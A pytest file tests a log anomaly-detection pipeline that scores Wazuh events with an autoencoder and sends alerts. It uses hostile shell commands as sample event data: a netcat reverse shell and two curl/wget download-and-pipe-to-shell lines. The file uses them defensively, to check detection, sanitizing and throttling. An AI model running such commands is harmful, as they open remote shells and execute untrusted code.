"""Tests for the inference pipeline wiring (process_line + scoring)."""

import json
import socket
from pathlib import Path

import torch

from src.features import LogVectorizer
from src.injector import QUEUE_PREFIX, WazuhSocketInjector
from src.model import LogAutoencoder
from src.pipeline import process_line, reconstruction_error
from src.sanitizer import ISOSanitizer

INPUT_DIM = 64
IDENTITY_MEAN = [0.0] * INPUT_DIM
IDENTITY_VAR = [1.0] * INPUT_DIM


def _sample_event_line() -> str:
    return json.dumps(
        {
            "agent": {"id": "007"},
            "data": {"command": "nc -e /bin/sh 8.8.8.8 4444", "process_name": "nc"},
        }
    )


def test_reconstruction_error_returns_non_negative_float() -> None:
    torch.manual_seed(0)
    model = LogAutoencoder()
    model.eval()
    vector = LogVectorizer().extract_vector(json.loads(_sample_event_line()))
    error = reconstruction_error(model, vector, IDENTITY_MEAN, IDENTITY_VAR)
    assert isinstance(error, float)
    assert error >= 0.0


def test_process_line_injects_alert_when_above_threshold(tmp_path: Path) -> None:
    socket_path = str(tmp_path / "queue")
    server = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
    server.bind(socket_path)
    try:
        model = LogAutoencoder()
        model.eval()
        injector = WazuhSocketInjector(socket_path)

        # tau = -1 forces every (non-negative) score to trigger an alert.
        result = process_line(
            _sample_event_line(),
            ISOSanitizer(),
            LogVectorizer(),
            model,
            injector,
            tau=-1.0,
            scaler_mean=IDENTITY_MEAN,
            scaler_var=IDENTITY_VAR,
            recent_alerts={},
            cooldown=1800.0,
        )
        assert result is not None

        raw = server.recv(65536).decode("utf-8")
        assert raw.startswith(QUEUE_PREFIX)
        alert = json.loads(raw[len(QUEUE_PREFIX):])["anomaly_detector"]
        assert alert["agent_id"] == "007"
        assert alert["process_name"] == "nc"
        # The command is enriched into the alert, already sanitized.
        assert alert["command"].startswith("nc -e /bin/sh")
        assert "8.8.8.8" not in alert["command"]
    finally:
        server.close()


def test_process_line_does_not_collide_distinct_commands(tmp_path: Path) -> None:
    """Two different anomalous commands (same agent/process) must both alert."""
    socket_path = str(tmp_path / "queue")
    server = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
    server.bind(socket_path)
    server.settimeout(0.2)
    try:
        model = LogAutoencoder()
        model.eval()
        injector = WazuhSocketInjector(socket_path)
        recent: dict = {}

        def run(command: str) -> None:
            line = json.dumps(
                {"agent": {"id": "007"}, "data": {"command": command, "process_name": "bash"}}
            )
            process_line(
                line,
                ISOSanitizer(),
                LogVectorizer(),
                model,
                injector,
                tau=-1.0,
                scaler_mean=IDENTITY_MEAN,
                scaler_var=IDENTITY_VAR,
                recent_alerts=recent,
                cooldown=1800.0,
            )

        run("curl http://host-a/x.sh | bash")
        assert server.recv(65536)  # first command alerts
        run("wget http://host-b/y.sh | sh")  # different command, same agent/process
        assert server.recv(65536)  # must alert too — no signature collision
    finally:
        server.close()


def test_process_line_drops_corrupt_line() -> None:
    model = LogAutoencoder()
    model.eval()
    injector = WazuhSocketInjector("/nonexistent/socket")
    result = process_line(
        "{ not json",
        ISOSanitizer(),
        LogVectorizer(),
        model,
        injector,
        tau=0.0,
        scaler_mean=IDENTITY_MEAN,
        scaler_var=IDENTITY_VAR,
        recent_alerts={},
        cooldown=1800.0,
    )
    assert result is None


def test_process_line_throttles_repeated_signature(tmp_path: Path) -> None:
    """An identical recurring event must alert once, then be suppressed."""
    socket_path = str(tmp_path / "queue")
    server = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
    server.bind(socket_path)
    server.settimeout(0.2)
    try:
        model = LogAutoencoder()
        model.eval()
        injector = WazuhSocketInjector(socket_path)
        recent: dict = {}

        def run() -> None:
            process_line(
                _sample_event_line(),
                ISOSanitizer(),
                LogVectorizer(),
                model,
                injector,
                tau=-1.0,
                scaler_mean=IDENTITY_MEAN,
                scaler_var=IDENTITY_VAR,
                recent_alerts=recent,
                cooldown=1800.0,
            )

        run()
        assert server.recv(65536)  # first occurrence alerts

        run()  # identical signature within cooldown -> suppressed
        try:
            server.recv(65536)
            assert False, "duplicate alert was not throttled"
        except socket.timeout:
            pass
    finally:
        server.close()


def test_process_line_drops_event_without_process_telemetry() -> None:
    """Wazuh internal events with no process/command telemetry are skipped."""
    model = LogAutoencoder()
    model.eval()
    injector = WazuhSocketInjector("/nonexistent/socket")
    noise = json.dumps({"agent": {"id": "000"}, "data": {"level": "3", "srcip": "8.8.8.8"}})
    result = process_line(
        noise,
        ISOSanitizer(),
        LogVectorizer(),
        model,
        injector,
        tau=-1.0,
        scaler_mean=IDENTITY_MEAN,
        scaler_var=IDENTITY_VAR,
        recent_alerts={},
        cooldown=1800.0,
    )
    assert result is None
